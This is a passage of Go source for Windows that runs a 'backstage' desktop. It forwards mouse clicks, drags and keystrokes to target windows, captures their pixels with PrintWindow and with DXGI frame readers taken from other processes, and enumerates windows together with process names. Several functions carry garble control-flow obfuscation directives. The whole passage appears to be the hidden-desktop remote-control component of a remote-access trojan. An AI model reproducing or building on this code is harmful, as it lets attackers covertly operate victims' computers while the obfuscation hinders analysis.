	bounds, _ := backstageResolveCaptureBounds(display)
	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		backstageInputMu.Lock()
		backstageLastCursor = point{x: x, y: y}
		backstageHasCursor = true
		backstageInputMu.Unlock()
		return nil
	}

	if bits := backstageLastScale.Load(); bits != 0 {
		if s := math.Float64frombits(bits); s > 0 && s < 1 {
			x = int32(float64(x) / s)
			y = int32(float64(y) / s)
		}
	}

	absX := bounds.Min.X + int(x)
	absY := bounds.Min.Y + int(y)
	if absX < bounds.Min.X {
		absX = bounds.Min.X
	}
	if absY < bounds.Min.Y {
		absY = bounds.Min.Y
	}
	if absX >= bounds.Max.X {
		absX = bounds.Max.X - 1
	}
	if absY >= bounds.Max.Y {
		absY = bounds.Max.Y - 1
	}

	backstageInputMu.Lock()
	backstageLastCursor = point{x: int32(absX), y: int32(absY)}
	backstageHasCursor = true
	backstageInputMu.Unlock()
	movebackstageWindowIfDragging(point{x: int32(absX), y: int32(absY)})

	pt := point{x: int32(absX), y: int32(absY)}
	hitHwnd := windowFromPoint(pt)
	if hitHwnd != 0 {
		root := rootWindow(hitHwnd)
		prevWorking := getWorkingWindow()
		rememberWorkingWindow(hitHwnd)
		prevRoot := rootWindow(prevWorking)
		if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
			procSetForegroundWindow.Call(root)
			procSetActiveWindow.Call(root)
			procSetFocus.Call(hitHwnd)
		}

		if backstageUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
			uiaHandleDragMove(pt)
			uiaHandleMouseMove(hitHwnd, pt)
			return nil
		}

		clientPt := pt
		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
	}
	return nil
}

func backstageMouseButtonOnThread(button int, down bool) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	pt := currentbackstageCursor()

	if button == 0 && !down {
		endbackstageWindowDrag(pt)
	}

	setMouseButton(button, down)

	hitHwnd := windowFromPoint(pt)
	if hitHwnd == 0 {
		return nil
	}

	// UIA branch: keep message-style clicks as the primary signal, but let
	// UIA resolve complicated targets such as WinUI3/Explorer elements.
	if backstageUIAEnabled.Load() {
		return uiaHandleMouseButton(hitHwnd, pt, button, down)
	}

	root := rootWindow(hitHwnd)
	prevWorking := getWorkingWindow()
	rememberWorkingWindow(hitHwnd)

	prevRoot := rootWindow(prevWorking)
	if down && (prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root))) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hitHwnd)
	}

	if button == 0 {
		lparam := makeLParam(pt.x, pt.y)
		hitTest := safeNCHitTest(hitHwnd, lparam)

		if hitTest != HTCLIENT && hitTest != 0 {
			if hitTest == HTCLOSE && !down {
				procPostMessageW.Call(hitHwnd, WM_CLOSE, 0, 0)
				procPostMessageW.Call(hitHwnd, WM_DESTROY, 0, 0)
				return nil
			}

			if hitTest == HTCAPTION {
				if down {
					var r rect
					if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
						backstageInputMu.Lock()
						backstageMovingWindow = true
						backstageWindowToMove = hitHwnd
						backstageMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
						backstageWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
						backstageInputMu.Unlock()
					}
				}
				return nil
			}

			if hitTest == HTMAXBUTTON && !down {
				if isWindowMaximized(hitHwnd) {
					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_RESTORE, 0)
				} else {
					procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
				}
				return nil
			}

			if hitTest == HTMINBUTTON && !down {
				procPostMessageW.Call(hitHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0)
				return nil
			}
		}
	}

	clientPt := pt
	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))

	var msg uint32
	var wparam uintptr
	switch button {
	case 0:
		if down {
			msg = WM_LBUTTONDOWN
			wparam = MK_LBUTTON
		} else {
			msg = WM_LBUTTONUP
			wparam = 0
		}
	case 1:
		if down {
			msg = WM_MBUTTONDOWN
			wparam = MK_MBUTTON
		} else {
			msg = WM_MBUTTONUP
			wparam = 0
		}
	case 2:
		if down {
			msg = WM_RBUTTONDOWN
			wparam = MK_RBUTTON
		} else {
			msg = WM_RBUTTONUP
			wparam = 0
		}
	default:
		return nil
	}

	postMouseMessage(hitHwnd, msg, wparam, clientPt)
	return nil
}

func backstageKeyOnThread(vk uint16, text string, down bool) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	pt := currentbackstageCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = foregroundWindow()
	}
	if hwnd == 0 {
		hwnd = getWorkingWindow()
	}
	if hwnd == 0 {
		hwnd = findAnyVisibleTopLevelWindow()
	}
	if hwnd == 0 {
		return nil
	}
	root := rootWindow(hwnd)
	prevWorking := getWorkingWindow()
	rememberWorkingWindow(root)
	prevRoot := rootWindow(prevWorking)
	if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
		procSetForegroundWindow.Call(root)
		procSetActiveWindow.Call(root)
		procSetFocus.Call(hwnd)
	}
	updateModifierState(vk, down)

	if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
		if isModifierVK(vk) {
			return nil
		}
		return uiaHandleKey(hwnd, vk, text, down)
	}

	if isModifierVK(vk) {
		return nil
	}

	if down {
		if text != "" && !isNonPrintableVK(vk) {
			postTextMessage(hwnd, text)
		} else if ch := virtualKeyToChars(vk); len(ch) > 0 && !isNonPrintableVK(vk) {
			for _, r := range ch {
				procPostMessageW.Call(hwnd, WM_CHAR, uintptr(r), uintptr(1))
			}
		} else {
			postKeyMessage(hwnd, WM_KEYDOWN, vk)
		}
	} else {
		postKeyMessage(hwnd, WM_KEYUP, vk)
	}
	return nil
}

func printableKeyText(text string) string {
	if !utf8.ValidString(text) || utf8.RuneCountInString(text) != 1 {
		return ""
	}
	r, _ := utf8.DecodeRuneInString(text)
	if r < 0x20 || r == 0x7f {
		return ""
	}
	return text
}

func postTextMessage(hwnd uintptr, text string) {
	for _, unit := range syscall.StringToUTF16(text) {
		if unit != 0 {
			procPostMessageW.Call(hwnd, WM_CHAR, uintptr(unit), uintptr(1))
		}
	}
}

func foregroundWindow() uintptr {
	r, _, _ := procGetForegroundWindow.Call()
	return r
}

func findAnyVisibleTopLevelWindow() uintptr {
	hwnd := getTopWindow(0)
	for hwnd != 0 {
		if isWindowVisible(hwnd) {
			return hwnd
		}
		hwnd = getWindow(hwnd, GW_HWNDNEXT)
	}
	return 0
}

func makeLParam(x, y int32) uintptr {
	return uintptr((uint32(y) << 16) | (uint32(x) & 0xFFFF))
}

func windowFromPoint(pt point) uintptr {
	ret, _, _ := procWindowFromPoint.Call(uintptr(*(*int64)(unsafe.Pointer(&pt))))
	return ret
}

func rootWindow(hwnd uintptr) uintptr {
	if hwnd == 0 {
		return 0
	}
	r, _, _ := procGetAncestor.Call(hwnd, GA_ROOT)
	if r == 0 {
		return hwnd
	}
	return r
}

func windowPID(hwnd uintptr) uint32 {
	var pid uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	return pid
}

func sameProcessWindows(a, b uintptr) bool {
	if a == 0 || b == 0 {
		return false
	}
	return windowPID(a) == windowPID(b)
}

func setWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	rememberWorkingWindow(hwnd)
	procSetForegroundWindow.Call(hwnd)
	procSetActiveWindow.Call(hwnd)
	procSetFocus.Call(hwnd)
}

func rememberWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	backstageInputMu.Lock()
	backstageWorkingWindow = hwnd
	backstageInputMu.Unlock()
}

func getWorkingWindow() uintptr {
	backstageInputMu.Lock()
	defer backstageInputMu.Unlock()
	return backstageWorkingWindow
}

func currentbackstageCursor() point {
	backstageInputMu.Lock()
	if backstageHasCursor {
		pt := backstageLastCursor
		backstageInputMu.Unlock()
		return pt
	}
	backstageInputMu.Unlock()
	var pt point
	procGetCursorPosbackstage.Call(uintptr(unsafe.Pointer(&pt)))
	return pt
}

func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
	procPostMessageW.Call(hwnd, uintptr(msg), wparam, makeLParam(pt.x, pt.y))
}

func setPendingActivation(hwnd uintptr) {
	backstageInputMu.Lock()
	backstagePendingActivate = hwnd
	backstageInputMu.Unlock()
}

func consumePendingActivation() uintptr {
	backstageInputMu.Lock()
	defer backstageInputMu.Unlock()
	hwnd := backstagePendingActivate
	backstagePendingActivate = 0
	return hwnd
}

func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
	scan := mapVirtualKey(uint32(vk))
	lparam := uintptr(1 | (scan << 16))
	if msg == WM_KEYUP {
		lparam |= 1 << 30
		lparam |= 1 << 31
	}
	procPostMessageW.Call(hwnd, uintptr(msg), uintptr(vk), lparam)
}

func setMouseButton(button int, down bool) uint32 {
	backstageInputMu.Lock()
	defer backstageInputMu.Unlock()
	var mask uint32
	switch button {
	case 0:
		mask = MK_LBUTTON
	case 1:
		mask = MK_MBUTTON
	case 2:
		mask = MK_RBUTTON
	default:
		return backstageMouseButtons
	}
	if down {
		backstageMouseButtons |= mask
	} else {
		backstageMouseButtons &^= mask
	}
	return backstageMouseButtons
}

func currentMouseButtons() uint32 {
	backstageInputMu.Lock()
	defer backstageInputMu.Unlock()
	return backstageMouseButtons
}

func mapVirtualKey(vk uint32) uintptr {
	r, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)
	return r
}

func virtualKeyToChars(vk uint16) []rune {
	buf := make([]uint16, 8)
	state := buildKeyboardState()
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		mapVirtualKey(uint32(vk)),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if ret == 0 {
		return nil
	}
	if ret < 0 {
		ret = -ret
	}
	return []rune(syscall.UTF16ToString(buf[:ret]))
}

func isWindowMaximized(hwnd uintptr) bool {
	type windowPlacement struct {
		length         uint32
		flags          uint32
		showCmd        uint32
		ptMinPositionX int32
		ptMinPositionY int32
		ptMaxPositionX int32
		ptMaxPositionY int32
		rcNormalLeft   int32
		rcNormalTop    int32
		rcNormalRight  int32
		rcNormalBottom int32
	}
	var wp windowPlacement
	wp.length = uint32(unsafe.Sizeof(wp))
	procGetWindowPlacement.Call(hwnd, uintptr(unsafe.Pointer(&wp)))
	return wp.showCmd == SW_SHOWMAXIMIZED
}

func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
	const timeoutMs = 75
	var result uintptr
	r, _, _ := procSendMessageTimeoutW.Call(
		hwnd,
		WM_NCHITTEST,
		0,
		lparam,
		SMTO_ABORTIFHUNG,
		timeoutMs,
		uintptr(unsafe.Pointer(&result)),
	)
	if r == 0 {
		return 0
	}
	return int32(result)
}

func movebackstageWindowIfDragging(screenPt point) {
	backstageInputMu.Lock()
	moving := backstageMovingWindow
	hwnd := backstageWindowToMove
	offset := backstageMoveOffset
	size := backstageWindowSize
	backstageInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func endbackstageWindowDrag(screenPt point) {
	backstageInputMu.Lock()
	moving := backstageMovingWindow
	hwnd := backstageWindowToMove
	offset := backstageMoveOffset
	size := backstageWindowSize
	backstageMovingWindow = false
	backstageWindowToMove = 0
	backstageInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func backstageMouseWheelOnThread(delta int32) error {
	pt := currentbackstageCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		hwnd = getWorkingWindow()
		if hwnd == 0 {
			return nil
		}
	}

	if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
		return uiaHandleMouseWheel(hwnd, pt, delta)
	}

	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
	return nil
}

func isNonPrintableVK(vk uint16) bool {
	if vk >= 0x70 && vk <= 0x7B { // F1-F12
		return true
	}
	switch vk {
	case 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28: // PageUp/Down, End, Home, Arrows
		return true
	case 0x2D, 0x2E: // Insert, Delete
		return true
	case 0x5B, 0x5C, 0x5D: // Win, Win, Apps
		return true
	case 0x91, 0x90: // Scroll, NumLock
		return true
	case 0x0D, 0x1B, 0x09, 0x08: // Enter, Escape, Tab, Backspace
		return true
	case 0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5, 0x14:
		return true
	default:
		return false
	}
}

func isModifierVK(vk uint16) bool {
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU, VK_CAPITAL:
		return true
	default:
		return false
	}
}

func updateModifierState(vk uint16, down bool) {
	backstageInputMu.Lock()
	defer backstageInputMu.Unlock()
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
		backstageShiftDown = down
	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
		backstageCtrlDown = down
	case VK_MENU, VK_LMENU, VK_RMENU:
		backstageAltDown = down
	case VK_CAPITAL:
		if down {
			backstageCapsLock = !backstageCapsLock
		}
	}
}

func buildKeyboardState() []byte {
	state := make([]byte, 256)
	backstageInputMu.Lock()
	shift := backstageShiftDown
	ctrl := backstageCtrlDown
	alt := backstageAltDown
	caps := backstageCapsLock
	backstageInputMu.Unlock()
	if shift {
		state[VK_SHIFT] = 0x80
	}
	if ctrl {
		state[VK_CONTROL] = 0x80
	}
	if alt {
		state[VK_MENU] = 0x80
	}
	if caps {
		state[VK_CAPITAL] = 0x01
	}
	return state
}

func BackstageMonitorCount() int {
	return displayCount()
}

func backstageResolveCaptureBounds(display int) (image.Rectangle, string) {
	mons := monitorList()
	if display >= 0 && display < len(mons) {
		mon := mons[display]
		bounds := captureBounds(mon)
		if bounds.Dx() > 0 && bounds.Dy() > 0 {
			return bounds, fmt.Sprintf("monitor=%d name=%q", display, mon.name)
		}
	}
	if desktopBounds, ok := backstageDesktopBounds(); ok {
		return desktopBounds, "desktop"
	}
	vx := int(getSystemMetric(SM_XVIRTUALSCREEN))
	vy := int(getSystemMetric(SM_YVIRTUALSCREEN))
	vw := int(getSystemMetric(SM_CXVIRTUALSCREEN))
	vh := int(getSystemMetric(SM_CYVIRTUALSCREEN))
	if vw > 0 && vh > 0 {
		return image.Rect(vx, vy, vx+vw, vy+vh), "virtual"
	}
	return image.Rectangle{}, "unknown"
}

func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
	hwnd := getTopWindow(0)
	if hwnd == 0 {
		return 0
	}
	hwnd = getWindow(hwnd, GW_HWNDLAST)
	if hwnd == 0 {
		return 0
	}

	// Initialize cache if needed
	if backstageWinCache == nil {
		backstageWinCache = make(map[uintptr]*backstageWinCacheEntry)
	}

	// Track which windows are still alive this frame
	alive := make(map[uintptr]bool)

	drawn := 0
	for hwnd != 0 {
		if drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
			drawn++
		}
		alive[hwnd] = true
		hwnd = getWindow(hwnd, GW_HWNDPREV)
	}

	// Evict cache entries for windows that no longer exist
	for h, entry := range backstageWinCache {
		if !alive[h] {
			backstageFreeCacheEntry(entry)
			delete(backstageWinCache, h)
		}
	}

	return drawn
}

func backstageGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *backstageWinCacheEntry {
	entry, ok := backstageWinCache[hwnd]
	if ok && entry.w == w && entry.h == h && entry.hdcMem != 0 && entry.hbmp != 0 {
		entry.age = 0
		return entry
	}
	if ok {
		backstageFreeCacheEntry(entry)
	}
	hdcMem := createCompatibleDC(hdcScreen)
	if hdcMem == 0 {
		return nil
	}
	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(w),
			biHeight:      -int32(h),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	var bits unsafe.Pointer
	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
	if hbmp == 0 || bits == nil {
		deleteDC(hdcMem)
		return nil
	}
	selectObject(hdcMem, hbmp)

	entry = &backstageWinCacheEntry{
		hdcMem: hdcMem,
		hbmp:   hbmp,
		bits:   bits,
		w:      w,
		h:      h,
	}
	backstageWinCache[hwnd] = entry
	return entry
}

func backstageFreeCacheEntry(entry *backstageWinCacheEntry) {
	if entry.hbmp != 0 {
		deleteObject(entry.hbmp)
	}
	if entry.hdcMem != 0 {
		deleteDC(entry.hdcMem)
	}
}

var dxgiFrameBuf []byte

var backstageDXGIEnabled atomic.Bool
var backstageUIAEnabled atomic.Bool

func init() {
	backstageDXGIEnabled.Store(false) // disabled by default
	backstageUIAEnabled.Store(false)  // disabled by default
}

func SetbackstageDXGIEnabled(enabled bool) {
	backstageDXGIEnabled.Store(enabled)
}

func GetbackstageDXGIEnabled() bool {
	return backstageDXGIEnabled.Load()
}

func SetbackstageUIAEnabled(enabled bool) {
	backstageUIAEnabled.Store(enabled)
}

func GetbackstageUIAEnabled() bool {
	return backstageUIAEnabled.Load()
}

func drawbackstageWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
	if !backstageDXGIEnabled.Load() {
		return false
	}
	var pid uint32
	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return false
	}

	reader := backstageGetFrameReader(pid)
	if reader == nil {
		backstageFrameReadersMu.Lock()
		gpuPID := backstageGPUPIDMap[pid]
		backstageFrameReadersMu.Unlock()
		if gpuPID != 0 {
			reader = backstageGetFrameReader(gpuPID)
		}
	}
	if reader == nil {
		return false
	}

	needed := winW * winH * 4
	if cap(dxgiFrameBuf) < needed {
		dxgiFrameBuf = make([]byte, needed)
	}
	buf := dxgiFrameBuf[:needed]

	frameW, frameH, ok := reader.readFrame(buf)
	if !ok {
		return false
	}

	copyW := minInt(winW, frameW)
	copyH := minInt(winH, frameH)
	if copyW <= 0 || copyH <= 0 {
		return false
	}

	srcStride := frameW * 4
	winStride := winW * 4

	effWinLeft := winLeft
	effWinTop := winTop
	effWinRight := winLeft + copyW
	effWinBottom := winTop + copyH

	interLeft := maxInt(effWinLeft, bounds.Min.X)
	interTop := maxInt(effWinTop, bounds.Min.Y)
	interRight := minInt(effWinRight, bounds.Max.X)
	interBottom := minInt(effWinBottom, bounds.Max.Y)
	if interRight <= interLeft || interBottom <= interTop {
		return false
	}

	srcX := interLeft - winLeft
	srcY := interTop - winTop
	dstX := interLeft - bounds.Min.X
	dstY := interTop - bounds.Min.Y
	blitW := interRight - interLeft
	blitH := interBottom - interTop

	for y := 0; y < blitH; y++ {
		srcStart := (srcY+y)*srcStride + srcX*4
		dstStart := (dstY+y)*targetStride + dstX*4
		copy(target[dstStart:dstStart+blitW*4], buf[srcStart:srcStart+blitW*4])
	}

	_ = winStride
	return true
}

func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
	if !isWindowVisible(hwnd) {
		return false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return false
	}
	winLeft := int(r.left)
	winTop := int(r.top)
	winRight := int(r.right)
	winBottom := int(r.bottom)
	if winRight <= winLeft || winBottom <= winTop {
		return false
	}
	if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
		return false
	}

	winW := winRight - winLeft
	winH := winBottom - winTop
	if winW <= 0 || winH <= 0 {
		return false
	}

	if drawn := drawbackstageWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
		return true
	}

	// Use pooled DC+DIB from cache
	entry := backstageGetOrCreateCache(hdcScreen, hwnd, winW, winH)
	if entry == nil {
		return false
	}

	if !printWindow(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT) {
		entry.lastOK = false
		entry.age++
		return false
	}
	entry.lastOK = true

	buf := unsafe.Slice((*byte)(entry.bits), winW*winH*4)
	winStride := winW * 4

	effTop, effLeft, effBottom, effRight := 0, 0, winH, winW

	topFound := false
	for y := 0; y < winH; y++ {
		rowBase := y * winStride
		for x := 0; x < winW; x++ {
			off := rowBase + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				effTop = y
				topFound = true
				break
			}
		}
		if topFound {
			break
		}
	}
	if !topFound {
		return false
	}

	for y := winH - 1; y > effTop; y-- {
		rowBase := y * winStride
		found := false
		for x := 0; x < winW; x++ {
			off := rowBase + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				found = true
				break
			}
		}
		if found {
			effBottom = y + 1
			break
		}
	}

	leftFound := false
	for x := 0; x < winW; x++ {
		for y := effTop; y < effBottom; y++ {
			off := y*winStride + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				effLeft = x
				leftFound = true
				break
			}
		}
		if leftFound {
			break
		}
	}

	for x := winW - 1; x > effLeft; x-- {
		found := false
		for y := effTop; y < effBottom; y++ {
			off := y*winStride + x*4
			if buf[off]|buf[off+1]|buf[off+2] != 0 {
				found = true
				break
			}
		}
		if found {
			effRight = x + 1
			break
		}
	}

	effWinLeft := winLeft + effLeft
	effWinTop := winTop + effTop
	effWinRight := winLeft + effRight
	effWinBottom := winTop + effBottom

	interLeft := maxInt(effWinLeft, bounds.Min.X)
	interTop := maxInt(effWinTop, bounds.Min.Y)
	interRight := minInt(effWinRight, bounds.Max.X)
	interBottom := minInt(effWinBottom, bounds.Max.Y)
	if interRight <= interLeft || interBottom <= interTop {
		return false
	}

	srcX := interLeft - winLeft
	srcY := interTop - winTop
	dstX := interLeft - bounds.Min.X
	dstY := interTop - bounds.Min.Y
	copyW := interRight - interLeft
	copyH := interBottom - interTop

	for y := 0; y < copyH; y++ {
		srcStart := (srcY+y)*winStride + srcX*4
		dstStart := (dstY+y)*targetStride + dstX*4
		copy(target[dstStart:dstStart+copyW*4], buf[srcStart:srcStart+copyW*4])
	}

	return true
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var (
	procGetWindowTextW    = user32.NewProc("GetWindowTextW")
	procGetWindowTextLenW = user32.NewProc("GetWindowTextLengthW")
)

type BackstageWindowInfo struct {
	HWND        uintptr
	Title       string
	X           int
	Y           int
	Width       int
	Height      int
	PID         uint32
	ProcessName string
	Monitor     int // -1 if not on any known monitor
	Visible     bool
}

func BackstageEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
	backstageDesktopMu.Lock()
	deskHandle := backstageDesktopHandle
	backstageDesktopMu.Unlock()
	if deskHandle == 0 {
		return nil, nil
	}

	mons := monitorList()
	monInfos := make([]BackstageMonitorInfo, len(mons))
	for i, m := range mons {
		monInfos[i] = BackstageMonitorInfo{
			Index:   i,
			Name:    m.name,
			X:       m.rect.Min.X,
			Y:       m.rect.Min.Y,
			Width:   m.rect.Dx(),
			Height:  m.rect.Dy(),
			Primary: m.primary,
		}
	}

	type rawWin struct {
		hwnd uintptr
	}
	var windows []rawWin

	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		windows = append(windows, rawWin{hwnd: hwnd})
		return 1
	})
	procEnumDesktopWindows.Call(deskHandle, cb, 0)

	var result []BackstageWindowInfo
	for _, w := range windows {
		if !isWindowVisible(w.hwnd) {
			continue
		}
		var r rect
		ok, _, _ := procGetWindowRect.Call(w.hwnd, uintptr(unsafe.Pointer(&r)))
		if ok == 0 {
			continue
		}
		winW := int(r.right - r.left)
		winH := int(r.bottom - r.top)
		if winW <= 0 || winH <= 0 {
			continue
		}

		title := getWindowText(w.hwnd)
		if title == "" {
			continue
		}

		var pid uint32
		procGetWindowThreadProcessId.Call(w.hwnd, uintptr(unsafe.Pointer(&pid)))

		procName := ""
		if pid != 0 {
			procName = getProcessName(pid)
		}

		winLeft := int(r.left)
		winTop := int(r.top)
		monIdx := -1
		bestOverlap := 0
		for i, m := range mons {
			overlapLeft := maxInt(winLeft, m.rect.Min.X)
			overlapTop := maxInt(winTop, m.rect.Min.Y)
			overlapRight := minInt(winLeft+winW, m.rect.Max.X)
			overlapBottom := minInt(winTop+winH, m.rect.Max.Y)
			if overlapRight > overlapLeft && overlapBottom > overlapTop {
				area := (overlapRight - overlapLeft) * (overlapBottom - overlapTop)
				if area > bestOverlap {
					bestOverlap = area
					monIdx = i
				}
			}
		}

		result = append(result, BackstageWindowInfo{
			HWND:        w.hwnd,
			Title:       title,
			X:           winLeft,
			Y:           winTop,
			Width:       winW,
			Height:      winH,
			PID:         pid,
			ProcessName: procName,
			Monitor:     monIdx,
			Visible:     true,
		})
	}
	return result, monInfos
}

type BackstageMonitorInfo struct {
	Index   int
	Name    string
	X       int
	Y       int
	Width   int
	Height  int
	Primary bool
}

func getWindowText(hwnd uintptr) string {
	length, _, _ := procGetWindowTextLenW.Call(hwnd)
	if length == 0 {
		return ""
	}
	buf := make([]uint16, length+1)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(length+1))
	return syscall.UTF16ToString(buf)
}

func getProcessName(pid uint32) string {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	hProc, _, _ := procOpenProcess.Call(PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid))
	if hProc == 0 {
		return ""
	}
	defer procCloseHandle.Call(hProc)
	var buf [260]uint16
	size := uint32(len(buf))
	ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
		hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return ""
	}
	fullPath := syscall.UTF16ToString(buf[:size])
	for i := len(fullPath) - 1; i >= 0; i-- {
		if fullPath[i] == '\\' || fullPath[i] == '/' {
			return fullPath[i+1:]
		}
	}
	return fullPath
}
